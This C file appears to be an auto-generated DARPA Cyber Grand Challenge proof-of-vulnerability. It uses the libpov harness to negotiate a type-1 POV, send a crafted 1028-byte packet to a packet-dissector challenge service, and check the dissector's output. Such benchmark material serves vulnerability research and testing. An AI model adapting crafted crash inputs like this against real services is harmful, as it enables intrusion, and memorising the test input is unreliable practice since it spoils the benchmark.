#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x0e\x2e\x1c\x35"
         "\x78\x88\xb3\x41\xb3\x43\x53\x18\x7e\x01\x00\x00\x2e\xf0\x4e\xe6"
         "\x6f\x53\x53\x82\x7a\x82\xb6\x37\x3e\xdf\x28\x94\x5e\xac\x53\xa6"
         "\x88\x6e\xb4\xe2\xeb\x53\x00\x4d\xa8\x73\xf1\x5c\xab\xae\x71\x53"
         "\x1f\x64\xca\x90\xc0\x00\x88\x88\x76\x2a\x94\xbd\x7b\xf6\x94\xba"
         "\xb5\xcb\x57\x97\x9f\x09\xd0\x3f\x91\xcc\x48\xf3\x24\x63\xfd\x85"
         "\x67\x99\x48\x77\xf7\xab\x50\xcc\xf0\xf6\x9a\xf5\x91\x16\x99\xe4"
         "\x24\x9b\x0c\x25\x50\xde\x80\x05\x85\xc2\x0b\xe3\xaf\x35\xcf\x05"
         "\x3c\x45\xae\xb8\x76\xfd\xa6\x8b\x4f\x1d\xd4\xf0\x88\xb2\xf6\x5d"
         "\xe0\xd5\xf0\xdf\xc9\x49\xfe\xa9\x7d\xd4\xf2\x0c\x82\x2d\xac\x82"
         "\x08\x73\xcc\xd1\x6f\x16\x2f\x10\xf5\x92\x5b\x41\x5a\x3b\xe2\xc9"
         "\x51\x1f\x3d\xf5\xb6\x78\xfb\xce\x8d\x0f\x29\x67\x7b\x2e\x40\x1e"
         "\x85\xa3\xc3\x15\x07\xba\x16\xd6\x03\x31\xe2\x2c\x27\x1e\x8b\xc5"
         "\x59\xe3\xb0\xf6\xf7\x2f\x1c\xba\x91\x81\x28\xa8\xd5\x88\xdb\xc7"
         "\x9e\xb7\xd6\x35\x41\x53\x97\x69\x28\x40\xfa\x1d\xba\x01\x04\x2a"
         "\x8d\x29\xd1\x71\x05\x2c\x19\x62\x34\xe6\x82\xd5\x28\xc4\x07\x13"
         "\x29\xa0\xa3\x63\x11\x47\xd8\x0d\xcd\x55\x25\xd6\xeb\x48\x9d\x0c"
         "\x34\x74\x77\xdc\xfa\x93\x29\xff\xac\xad\x68\x58\x3c\xd0\x7a\x29"
         "\x7c\xd5\xc0\x77\x11\x48\xe4\x5c\x93\x23\x62\x0f\x99\xeb\xfd\x9d"
         "\x23\xfa\x92\x1d\x86\xd6\x9c\x82\xfe\xd3\xa6\xb3\xed\xd3\x07\xe6"
         "\xe2\x55\x38\x7f\xb0\x2e\x20\x46\xdb\xbf\x2b\x9f\x9f\x4b\x5b\xc2"
         "\x5e\xa5\x9d\xb8\x7b\x71\xaa\x3c\x5c\xed\xde\xee\xba\xaa\x8d\x84"
         "\x31\x7d\x11\xea\xa8\x72\x3d\xf9\xd7\xaf\x26\x53\x4d\xed\xe9\xb3"
         "\x27\xff\xa4\x2e\x53\xd4\xe0\x31\x7c\x54\x16\xff\xa3\xcb\x00\x90"
         "\xb4\xfa\x5f\x12\xb7\xe8\x13\x99\xc8\x0b\xda\xdf\xbc\x40\x48\x7d"
         "\x67\xe3\xc7\x90\x6d\xcf\xab\x99\xe6\xca\x5d\x41\x2d\x2b\xc2\xea"
         "\x44\xed\x1e\x6c\x81\x8a\x8e\x77\xc7\x7a\xa0\xb8\xf1\xeb\x50\x87"
         "\xfb\x4c\xc4\xee\xfb\x33\x34\xf1\x21\xe4\xe6\x23\x6b\xce\x3a\xdf"
         "\x63\xcb\xfa\xb8\x5b\xd2\x39\xc3\x4e\x57\x98\x96\x0e\xe5\x8f\x72"
         "\x5d\x73\x7f\x01\x08\xbb\x4d\x86\x78\x25\x2f\xef\xc2\xb3\x47\x67"
         "\xaa\x02\xc3\x83\x4b\x48\xbd\x78\x0e\xa1\x59\x7f\x1f\x44\x07\xfc"
         "\x8a\x6e\xfa\xa0\x0f\x27\xb6\xbf\x06\xc1\xed\x73\xbf\x69\x8c\x1d"
         "\x4e\x6b\x39\xfe\x28\xd9\x68\xe3\x0c\xdf\xd1\x46\x53\x4d\xea\x41"
         "\xf6\x5c\x41\x16\x5b\x37\x99\x87\x30\x65\xa0\xce\xee\x35\x60\x1b"
         "\xea\xb5\x8b\x8a\x1f\xf0\x6e\x4b\x44\xa6\xbc\xe4\xf8\xcd\xcb\x0f"
         "\x1c\x18\x9f\xf4\x39\x64\xbc\xc0\x0e\xc5\xe4\x1e\x88\x11\x0c\xae"
         "\x06\x8d\x54\x12\xa0\x7c\x08\x1c\xea\xf9\x6f\x65\x93\x50\xd9\xc5"
         "\x2b\x35\xf7\x00\xb0\x10\xd2\x89\xd2\x84\x56\x66\xac\x0f\x66\x98"
         "\xcd\xeb\x7f\x2a\x93\x1a\xf8\x21\x10\xa7\xd0\x80\xf9\x46\x61\x4e"
         "\x32\xf9\x13\xf9\xca\xda\x7d\x7b\x3a\x80\x79\x82\x5e\x20\x57\x3e"
         "\xdb\xc0\x1d\x9c\xf8\xc9\x81\xfc\x39\xdd\xb3\xe2\xae\xc4\x2d\x73"
         "\xa0\xd3\xc7\xa7\xd5\xe8\xc6\x87\xaf\x7a\xbd\xf5\x1e\xa1\x5c\x78"
         "\x27\x02\x46\x36\xdb\xf1\xcc\xb7\x1e\x58\x15\x5a\xa5\x72\xbf\x35"
         "\x72\xf8\xbe\xb0\xd4\x5c\xec\x25\x52\x9a\xd9\x0d\x12\xb1\x65\xaf"
         "\xd4\x13\xf9\x96\x74\x53\x00\x5d\x16\x44\xe7\xf2\x12\xe1\x52\xb4"
         "\x76\x2b\xf3\x6b\xf9\x53\x70\x89\x85\xf4\x6a\x3b\x28\xb4\x39\xf4"
         "\x75\xf7\xd4\xbc\xed\xa8\x90\x5c\x5a\xbc\xfc\xdf\xd8\x3a\xe1\x4e"
         "\x58\xea\xe8\x1d\x4f\x45\xd8\x25\xff\x0b\x99\xf4\x65\x5a\xcb\x6f"
         "\x76\x97\x0a\xee\x8b\xbd\x62\xb4\xcc\x24\xf9\xf5\xae\x3e\x76\x70"
         "\x19\x0d\xb4\x58\x71\xb4\xad\xd0\x6c\x8d\xc0\xc2\x11\x40\xe8\x87"
         "\x2b\xef\xe0\x5e\x82\x67\x83\xf3\x48\x4e\x53\x59\xd2\x7e\x59\xcc"
         "\x2a\xb6\x0b\x09\xd2\xf0\xd1\xb7\x5c\x88\x3e\x9d\xe0\x62\xb5\xda"
         "\x86\x1b\xa7\x68\xf8\x4d\x90\x53\x00\xdc\x74\x3c\x94\xb0\xa9\x3b"
         "\x5f\xe0\x6d\x97\x8c\xc5\xe7\x98\x11\x53\x54\x9d\x52\x8c\xbf\xf7"
         "\x4c\x6d\x2a\xa2\x37\xd1\x2e\x71\x04\x8a\x41\x92\x98\x7e\x64\x2a"
         "\x82\xc0\x8f\xc5\x5f\x13\xcd\x32\x23\x8e\xbe\xfb\x81\xae\x65\xcd"
         "\x92\x53\x00\x6c\x38\xe0\xcc\x68\xbc\xbc\x18\xae\x39\x41\xdf\x63"
         "\x9e\x77\x19\x06\xbc\x9d\x91\x81\x00\x99\xa4\xfd\x23\x8d\xe2\x11"
         "\xe6\x5c\xec\x1f\x0d\x2c\x35\x7a\xfb\xd3\xc7\xc9\xd3\xbf\xd2\xc9"
         "\x17\xf7\x7c\x15\x2a\x50\xa1\x49\x38\xab\xc5\x9e\xbe\x5c\x1a\x53"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===projicientcolumellate
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x70\x72\x6f\x6a\x69\x63\x69\x65\x6e\x74\x63"
         "\x6f\x6c\x75\x6d\x65\x6c\x6c\x61\x74\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
